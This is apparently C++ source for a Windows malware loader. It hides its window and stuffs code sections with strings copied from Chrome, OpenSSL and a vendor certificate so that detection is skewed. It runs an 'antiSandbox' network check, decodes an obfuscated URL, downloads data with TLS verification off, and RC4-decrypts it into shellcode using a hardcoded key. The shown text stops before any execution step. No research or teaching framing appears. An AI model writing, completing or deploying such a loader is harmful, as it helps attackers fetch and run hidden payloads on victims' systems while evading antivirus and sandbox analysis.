#pragma warning(disable:4996)
#define BUILDING_LIBCURL

#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

// allows us to the fix the entropy of any section
#pragma code_seg(".text")
__declspec(allocate(".text")) const char* e1[] = { "---------------------------7d9114302a0cb6", "Vector Permutation AES for x86/SSSE3, Mike Hamburg (Stanford University)", "too many files open in system", "Resource temporarily unavailable" , "../../third_party/perfetto/src/protozero/scattered_heap_buffer.cc" , "../../base/trace_event/trace_log.cc" , "Histogram.MismatchedConstructionArguments" , "web_cache/Encoded_size_duplicated_in_data_urls" , "2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA" , "Beijing Qihu Technology Co., Ltd.0" };
#pragma code_seg(".data")
__declspec(allocate(".data")) const char* e2[] = { "GHASH for x86, CRYPTOGAMS by <appro@openssl.org>", "inappropriate io control operation", "illegal byte sequence" , "no such file or directory", "Inappropriate I/O control operation", "Content-Disposition: form-data; name=\"", "disabled-by-default-java-heap-profiler" , "disabled-by-default-devtools.timeline.invalidationTracking" , "Unsupported (crbug.com/1225176)\"" , "net/http_network_session_0x?/ssl_client_session_cache" , "net/url_request_context/isolated_media/0x?/cookie_monster/tasks_pending_global" , "Ihttp://crl3.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crl0" ,"Beijing Qihu Technology Co., Ltd.0" };

#include "utils/b64_rc4_hex.h"
#include "curl/curl.h"

#if	_WIN64
#if _DEBUG
#pragma comment(lib, "libssld.x64.lib")
#pragma comment(lib, "libcryptod.x64.lib")
#pragma comment(lib, "libcurld.x64.lib")
#else
#pragma comment(lib, "libssl.x64.lib")
#pragma comment(lib, "libcrypto.x64.lib")
#pragma comment(lib, "libcurl.x64.lib")
#endif
#else
#if _DEBUG
#pragma comment(lib, "libssld.x86.lib")
#pragma comment(lib, "libcryptod.x86.lib")
#pragma comment(lib, "libcurld.x86.lib")
#else
#pragma comment(lib, "libssl.x86.lib")
#pragma comment(lib, "libcrypto.x86.lib")
#pragma comment(lib, "libcurl.x86.lib")
#endif
#endif

#pragma comment(lib, "ws2_32.lib") 
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "wldap32.lib")



std::string encodedUrl = "1TKM1LdB19iMf91OfA2wQTd919qCfTXt1TfCQ42D1TGMf9dB1TfCQTQIfAqCf9QA1A3924fDf9391Lf9fA29f4fCf9K9f4fwf9291Lfwf9i9fLfCf9q91Lf9fAqMfLQt1Td=";
std::string encryptKey = "0123456789abcdefghijklmnopqrstuv";


size_t req_reply(void* ptr, size_t size, size_t nmemb, void* stream)
{
    std::string* str = (std::string*)stream;
    (*str).append((char*)ptr, size * nmemb);
    return size * nmemb;
}

// http GET  
CURLcode httpGet(const std::string& url, std::string& response)
{
    // init curl  
    CURL* curl = curl_easy_init();
    // res code  
    CURLcode res;
    if (curl)
    {
        // set params  
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str()); // url  
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false); // if want to use https  
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false); // set peer and host verify false 
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 0);
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, req_reply);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&response);
        curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1);
        curl_easy_setopt(curl, CURLOPT_HEADER, 0);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 30); // set transport and time out time  
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30);
        // start req  
        res = curl_easy_perform(curl);
    }
    // release curl  
    curl_easy_cleanup(curl);
    return res;
}

void antiSandbox()
{
    // init curl  
    CURL* curl = curl_easy_init();
    // res code  
    CURLcode res;
    if (curl)
    {
        // set params  
        curl_easy_setopt(curl, CURLOPT_URL, "https://www.google.com/"); // url  
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false); // if want to use https  
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false); // set peer and host verify false 
        curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 53210);
        // start req  
        res = curl_easy_perform(curl);
        if (res == CURLE_OK)
        {
            exit(0);
        }
    }
    // release curl  
    curl_easy_cleanup(curl);
}

std::string GetShellcodeFromUrl()
{
    std::string data;
    std::string shellcode_str;
	auto res = httpGet(hex_decode(base64_decode(encodedUrl)), data);

    shellcode_str = rc4_encrypt_decrypt(hex_decode(base64_decode(data)), encryptKey);
    return shellcode_str;
}


void* mc(void* dest, const void* src, size_t n) 
{
	char* d = (char*)dest;
	const char* s = (const char*)src;
	while (n--)
		*d++ = *s++;
	return dest;
}